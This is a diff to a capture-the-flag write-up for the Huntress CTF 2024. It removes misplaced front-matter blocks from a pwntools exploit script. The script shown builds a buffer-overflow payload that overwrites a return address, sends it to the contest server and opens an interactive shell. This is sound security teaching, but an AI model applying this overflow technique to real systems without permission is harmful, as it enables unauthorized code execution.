@@ -102,44 +102,18 @@ from pwn import *
 
 target_function_address = 0x080491f5  # Address of target function
 
----
-title:          "Construct the payload (Huntress CTF 2024)"
-pubDate:        2024-11-27
-description:    CTF ComSec CyberSecurity Write-up Huntress Huntress-CTF-2024
----
-
 # Construct the payload
-
 payload = b'A' * 16 + b'B' * 4 + p32(target_function_address)
 
----
-title:          "Connect to the remote service (Huntress CTF 2024)"
-pubDate:        2024-11-27
-description:    CTF ComSec CyberSecurity Write-up Huntress Huntress-CTF-2024
----
-
 # Connect to the remote service
-
 p = remote("challenge.ctf.games", PORT)
 
----
-title:          "Send the payload (Huntress CTF 2024)"
-pubDate:        2024-11-27
-description:    CTF ComSec CyberSecurity Write-up Huntress Huntress-CTF-2024
----
 
 # Send the payload
-
 p.sendline(payload)
 
----
-title:          "Drop into interactive mode to access the shell (Huntress CTF 2024)"
-pubDate:        2024-11-27
-description:    CTF ComSec CyberSecurity Write-up Huntress Huntress-CTF-2024
----
 
 # Drop into interactive mode to access the shell
-
 p.interactive()
 ```
 
